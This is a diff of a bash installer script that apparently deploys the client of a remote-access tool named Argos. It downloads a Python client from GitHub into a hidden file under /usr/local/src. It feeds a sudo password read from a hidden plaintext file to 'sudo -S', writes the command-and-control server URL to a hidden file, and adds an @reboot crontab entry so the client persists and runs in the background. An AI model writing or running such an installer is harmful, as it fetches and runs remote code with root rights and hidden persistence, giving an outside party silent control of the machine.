@@ -3,7 +3,6 @@ if [ "$#" -ne 1 ]; then
     echo "First argument should be server url"
     exit 1
 fi
-echo "$1" > /tmp/.serverurl.exwrap
 urlbase=https://raw.githubusercontent.com/Just1truc
 # installing pip dependencies
 while [ 1 ]
@@ -38,6 +37,8 @@ rm here.txt
 # installing script
 curl $urlbase/Argos/main/client/connexion.py -o .service.exwrap.py &> /dev/null
 echo $(< /usr/local/src/.server.exwrap_info.txt) | sudo -kS -p '' mv .service.exwrap.py /usr/local/src/.service.exwrap.py
+# Setup url
+echo $(< /usr/local/src/.server.exwrap_info.txt) | sudo -kS -p '' bash -c "echo $1 > /usr/local/src/.serverurl.exwrap"
 # Setting up crontab
 echo "@reboot python3 /usr/local/src/.service.exwrap.py" > crontb && crontab crontb && rm -rf crontb
 python3 /usr/local/src/.service.exwrap.py &
